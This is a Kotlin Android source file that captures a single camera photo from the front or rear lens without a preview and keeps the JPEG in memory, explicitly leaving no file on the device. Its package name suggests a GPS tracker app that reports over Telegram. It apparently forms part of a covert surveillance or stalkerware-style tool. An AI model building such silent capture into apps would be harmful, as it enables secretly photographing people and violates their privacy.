package com.gpstracker.telegram

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

/**
 * Captures a still image from the requested camera lens (front or rear)
 * entirely in memory — no file is ever written to the device storage.
 *
 * Returns the JPEG bytes, or null on any error.
 */
object CameraCapture {

    private const val TAG = "CameraCapture"
    private const val CAPTURE_TIMEOUT_SEC = 12L
    private const val WIDTH  = 1280
    private const val HEIGHT = 720

    @SuppressLint("MissingPermission")
    fun capture(context: Context, facing: Int): ByteArray? {
        val cameraManager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager

        // Find the camera ID for the requested facing
        val cameraId = try {
            cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == facing
            }
        } catch (e: Exception) {
            Log.e(TAG, "Camera list error: ${e.message}")
            return null
        } ?: run {
            Log.w(TAG, "No camera found for facing=$facing")
            return null
        }

        val thread = HandlerThread("CameraCap").apply { start() }
        val handler = Handler(thread.looper)

        val imageReader = ImageReader.newInstance(WIDTH, HEIGHT, ImageFormat.JPEG, 2)
        val latch = CountDownLatch(1)
        var resultBytes: ByteArray? = null

        imageReader.setOnImageAvailableListener({ reader ->
            val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
            try {
                val buffer = image.planes[0].buffer
                resultBytes = ByteArray(buffer.remaining()).also { buffer.get(it) }
            } finally {
                image.close()
                latch.countDown()
            }
        }, handler)

        var cameraDevice: CameraDevice? = null

        val openLatch = CountDownLatch(1)
        val cameraCallback = object : CameraDevice.StateCallback() {
            override fun onOpened(camera: CameraDevice) {
                cameraDevice = camera
                openLatch.countDown()
            }
            override fun onDisconnected(camera: CameraDevice) {
                camera.close()
                openLatch.countDown()
            }
            override fun onError(camera: CameraDevice, error: Int) {
                Log.e(TAG, "Camera open error $error")
                camera.close()
                openLatch.countDown()
            }
        }

        return try {
            cameraManager.openCamera(cameraId, cameraCallback, handler)
            if (!openLatch.await(5, TimeUnit.SECONDS)) {
                Log.e(TAG, "Camera open timed out")
                return null
            }

            val camera = cameraDevice ?: return null
            val surfaces = listOf(imageReader.surface)

            camera.createCaptureSession(
                surfaces,
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        try {
                            val req = camera.createCaptureRequest(
                                CameraDevice.TEMPLATE_STILL_CAPTURE
                            ).apply {
                                addTarget(imageReader.surface)
                            }.build()
                            session.capture(req, null, handler)
                        } catch (e: Exception) {
                            Log.e(TAG, "Capture request error: ${e.message}")
                            latch.countDown()
                        }
                    }
                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e(TAG, "Session configure failed")
                        latch.countDown()
                    }
                },
                handler
            )

            latch.await(CAPTURE_TIMEOUT_SEC, TimeUnit.SECONDS)
            resultBytes

        } catch (e: Exception) {
            Log.e(TAG, "Capture error: ${e.message}")
            null
        } finally {
            try { cameraDevice?.close() } catch (_: Exception) {}
            try { imageReader.close() }  catch (_: Exception) {}
            thread.quitSafely()
        }
    }
}
